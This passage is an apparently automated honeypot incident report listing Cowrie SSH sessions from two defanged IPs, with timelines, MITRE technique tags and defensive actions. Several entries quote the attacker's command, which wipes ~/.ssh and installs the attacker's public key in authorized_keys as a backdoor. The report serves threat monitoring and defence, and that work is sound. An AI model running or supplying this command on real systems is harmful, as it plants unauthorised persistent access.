| `2026-04-21 18:54:20` | `cowrie.command.input` |
| `2026-04-21 18:54:20` | `cowrie.command.failed` |
| `2026-04-21 18:54:20` | `cowrie.log.closed` |
| `2026-04-21 18:54:20` | `cowrie.session.params` |
| `2026-04-21 18:54:20` | `cowrie.command.input` |
| `2026-04-21 18:54:21` | `cowrie.session.file_download` |
| `2026-04-21 18:54:21` | `cowrie.log.closed` |
| `2026-04-21 18:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e9700e5a224

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 18:54 |
| **Last Seen** | 2026-04-21 18:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 18:54:23` | `cowrie.session.connect` |
| `2026-04-21 18:54:23` | `cowrie.client.version` |
| `2026-04-21 18:54:23` | `cowrie.client.kex` |
| `2026-04-21 18:54:24` | `cowrie.login.success` |
| `2026-04-21 18:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-385e5af44562

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 18:56 |
| **Last Seen** | 2026-04-21 18:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 18:56:47` | `cowrie.session.connect` |
| `2026-04-21 18:56:47` | `cowrie.client.version` |
| `2026-04-21 18:56:47` | `cowrie.client.kex` |
| `2026-04-21 18:56:47` | `cowrie.login.success` |
| `2026-04-21 18:56:48` | `cowrie.session.params` |
| `2026-04-21 18:56:48` | `cowrie.command.input` |
| `2026-04-21 18:56:48` | `cowrie.command.failed` |
| `2026-04-21 18:56:48` | `cowrie.log.closed` |
| `2026-04-21 18:56:48` | `cowrie.session.params` |
| `2026-04-21 18:56:48` | `cowrie.command.input` |
| `2026-04-21 18:56:48` | `cowrie.session.file_download` |
| `2026-04-21 18:56:48` | `cowrie.log.closed` |
| `2026-04-21 18:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01d2732f5b57

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 18:56 |
| **Last Seen** | 2026-04-21 18:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 18:56:51` | `cowrie.session.connect` |
| `2026-04-21 18:56:51` | `cowrie.client.version` |
| `2026-04-21 18:56:51` | `cowrie.client.kex` |
| `2026-04-21 18:56:51` | `cowrie.login.success` |
| `2026-04-21 18:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d155585b106

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 18:58 |
| **Last Seen** | 2026-04-21 18:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 18:58:25` | `cowrie.session.connect` |
| `2026-04-21 18:58:25` | `cowrie.client.version` |
| `2026-04-21 18:58:26` | `cowrie.client.kex` |
| `2026-04-21 18:58:26` | `cowrie.login.success` |
| `2026-04-21 18:58:26` | `cowrie.session.params` |
| `2026-04-21 18:58:26` | `cowrie.command.input` |
| `2026-04-21 18:58:26` | `cowrie.command.failed` |
| `2026-04-21 18:58:27` | `cowrie.log.closed` |
| `2026-04-21 18:58:27` | `cowrie.session.params` |
| `2026-04-21 18:58:27` | `cowrie.command.input` |
| `2026-04-21 18:58:27` | `cowrie.session.file_download` |
| `2026-04-21 18:58:27` | `cowrie.log.closed` |
| `2026-04-21 18:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0f8947a9de3

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 18:58 |
| **Last Seen** | 2026-04-21 18:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 18:58:29` | `cowrie.session.connect` |
| `2026-04-21 18:58:29` | `cowrie.client.version` |
| `2026-04-21 18:58:30` | `cowrie.client.kex` |
| `2026-04-21 18:58:30` | `cowrie.login.success` |
| `2026-04-21 18:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-168950baef82

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 18:59 |
| **Last Seen** | 2026-04-21 18:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 18:59:14` | `cowrie.session.connect` |
| `2026-04-21 18:59:14` | `cowrie.client.version` |
| `2026-04-21 18:59:14` | `cowrie.client.kex` |
| `2026-04-21 18:59:15` | `cowrie.login.success` |
| `2026-04-21 18:59:15` | `cowrie.session.params` |
| `2026-04-21 18:59:15` | `cowrie.command.input` |
| `2026-04-21 18:59:15` | `cowrie.command.failed` |
| `2026-04-21 18:59:16` | `cowrie.log.closed` |
| `2026-04-21 18:59:16` | `cowrie.session.params` |
| `2026-04-21 18:59:16` | `cowrie.command.input` |
| `2026-04-21 18:59:16` | `cowrie.session.file_download` |
| `2026-04-21 18:59:16` | `cowrie.log.closed` |
| `2026-04-21 18:59:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcee2118a0ff

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 18:59 |
| **Last Seen** | 2026-04-21 18:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 18:59:18` | `cowrie.session.connect` |
| `2026-04-21 18:59:18` | `cowrie.client.version` |
| `2026-04-21 18:59:18` | `cowrie.client.kex` |
| `2026-04-21 18:59:19` | `cowrie.login.success` |
| `2026-04-21 18:59:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15e927f54310

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:00 |
| **Last Seen** | 2026-04-21 19:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:00:04` | `cowrie.session.connect` |
| `2026-04-21 19:00:04` | `cowrie.client.version` |
| `2026-04-21 19:00:05` | `cowrie.client.kex` |
| `2026-04-21 19:00:05` | `cowrie.login.success` |
| `2026-04-21 19:00:06` | `cowrie.session.params` |
| `2026-04-21 19:00:06` | `cowrie.command.input` |
| `2026-04-21 19:00:06` | `cowrie.command.failed` |
| `2026-04-21 19:00:06` | `cowrie.log.closed` |
| `2026-04-21 19:00:06` | `cowrie.session.params` |
| `2026-04-21 19:00:06` | `cowrie.command.input` |
| `2026-04-21 19:00:06` | `cowrie.session.file_download` |
| `2026-04-21 19:00:06` | `cowrie.log.closed` |
| `2026-04-21 19:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7bbb303bd1e

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:00 |
| **Last Seen** | 2026-04-21 19:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:00:08` | `cowrie.session.connect` |
| `2026-04-21 19:00:08` | `cowrie.client.version` |
| `2026-04-21 19:00:08` | `cowrie.client.kex` |
| `2026-04-21 19:00:09` | `cowrie.login.success` |
| `2026-04-21 19:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542dd4e1cfb2

| Field | Detail |
|---|---|
| **Source IP** | `4.247.141[.]61` |
| **First Seen** | 2026-04-21 19:02 |
| **Last Seen** | 2026-04-21 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:02:21` | `cowrie.session.connect` |
| `2026-04-21 19:02:21` | `cowrie.client.version` |
| `2026-04-21 19:02:21` | `cowrie.client.kex` |
| `2026-04-21 19:02:21` | `cowrie.login.success` |
| `2026-04-21 19:02:21` | `cowrie.session.params` |
| `2026-04-21 19:02:21` | `cowrie.command.input` |
| `2026-04-21 19:02:21` | `cowrie.command.failed` |
| `2026-04-21 19:02:21` | `cowrie.log.closed` |
| `2026-04-21 19:02:21` | `cowrie.session.params` |
| `2026-04-21 19:02:21` | `cowrie.command.input` |
| `2026-04-21 19:02:21` | `cowrie.session.file_download` |
| `2026-04-21 19:02:21` | `cowrie.log.closed` |
| `2026-04-21 19:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.141[.]61` to AbuseIPDB if not already reported
- [ ] Block `4.247.141[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-093cd2f20a88

| Field | Detail |
|---|---|
| **Source IP** | `4.247.141[.]61` |
| **First Seen** | 2026-04-21 19:02 |
| **Last Seen** | 2026-04-21 19:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:02:23` | `cowrie.session.connect` |
| `2026-04-21 19:02:23` | `cowrie.client.version` |
| `2026-04-21 19:02:23` | `cowrie.client.kex` |
| `2026-04-21 19:02:23` | `cowrie.login.success` |
| `2026-04-21 19:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.141[.]61` to AbuseIPDB if not already reported
- [ ] Block `4.247.141[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7da443bba16c

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:02 |
| **Last Seen** | 2026-04-21 19:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:02:36` | `cowrie.session.connect` |
| `2026-04-21 19:02:36` | `cowrie.client.version` |
| `2026-04-21 19:02:36` | `cowrie.client.kex` |
| `2026-04-21 19:02:36` | `cowrie.login.success` |
| `2026-04-21 19:02:37` | `cowrie.session.params` |
| `2026-04-21 19:02:37` | `cowrie.command.input` |
| `2026-04-21 19:02:37` | `cowrie.command.failed` |
| `2026-04-21 19:02:37` | `cowrie.log.closed` |
| `2026-04-21 19:02:37` | `cowrie.session.params` |
| `2026-04-21 19:02:37` | `cowrie.command.input` |
| `2026-04-21 19:02:37` | `cowrie.session.file_download` |
| `2026-04-21 19:02:37` | `cowrie.log.closed` |
| `2026-04-21 19:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd0eabaddcc3

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:02 |
| **Last Seen** | 2026-04-21 19:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:02:40` | `cowrie.session.connect` |
| `2026-04-21 19:02:40` | `cowrie.client.version` |
| `2026-04-21 19:02:40` | `cowrie.client.kex` |
| `2026-04-21 19:02:40` | `cowrie.login.success` |
| `2026-04-21 19:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e2d961e565

| Field | Detail |
|---|---|
| **Source IP** | `4.247.141[.]61` |
| **First Seen** | 2026-04-21 19:03 |
| **Last Seen** | 2026-04-21 19:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:03:17` | `cowrie.session.connect` |
| `2026-04-21 19:03:17` | `cowrie.client.version` |
| `2026-04-21 19:03:17` | `cowrie.client.kex` |
| `2026-04-21 19:03:17` | `cowrie.login.success` |
| `2026-04-21 19:03:17` | `cowrie.session.params` |
| `2026-04-21 19:03:17` | `cowrie.command.input` |
| `2026-04-21 19:03:17` | `cowrie.command.failed` |
| `2026-04-21 19:03:17` | `cowrie.log.closed` |
| `2026-04-21 19:03:17` | `cowrie.session.params` |
| `2026-04-21 19:03:17` | `cowrie.command.input` |
| `2026-04-21 19:03:17` | `cowrie.session.file_download` |
| `2026-04-21 19:03:17` | `cowrie.log.closed` |
| `2026-04-21 19:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.141[.]61` to AbuseIPDB if not already reported
- [ ] Block `4.247.141[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e955f9b9e25f

| Field | Detail |
|---|---|
| **Source IP** | `4.247.141[.]61` |
| **First Seen** | 2026-04-21 19:03 |
| **Last Seen** | 2026-04-21 19:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:03:18` | `cowrie.session.connect` |
| `2026-04-21 19:03:18` | `cowrie.client.version` |
| `2026-04-21 19:03:18` | `cowrie.client.kex` |
| `2026-04-21 19:03:18` | `cowrie.login.success` |
| `2026-04-21 19:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.141[.]61` to AbuseIPDB if not already reported
- [ ] Block `4.247.141[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc7992f6e0bf

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:03 |
| **Last Seen** | 2026-04-21 19:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:03:29` | `cowrie.session.connect` |
| `2026-04-21 19:03:29` | `cowrie.client.version` |
| `2026-04-21 19:03:29` | `cowrie.client.kex` |
| `2026-04-21 19:03:30` | `cowrie.login.success` |
| `2026-04-21 19:03:30` | `cowrie.session.params` |
| `2026-04-21 19:03:30` | `cowrie.command.input` |
| `2026-04-21 19:03:30` | `cowrie.command.failed` |
| `2026-04-21 19:03:30` | `cowrie.log.closed` |
| `2026-04-21 19:03:31` | `cowrie.session.params` |
| `2026-04-21 19:03:31` | `cowrie.command.input` |
| `2026-04-21 19:03:31` | `cowrie.session.file_download` |
| `2026-04-21 19:03:31` | `cowrie.log.closed` |
| `2026-04-21 19:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0387d706c878

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:03 |
| **Last Seen** | 2026-04-21 19:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:03:33` | `cowrie.session.connect` |
| `2026-04-21 19:03:33` | `cowrie.client.version` |
| `2026-04-21 19:03:33` | `cowrie.client.kex` |
| `2026-04-21 19:03:34` | `cowrie.login.success` |
| `2026-04-21 19:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

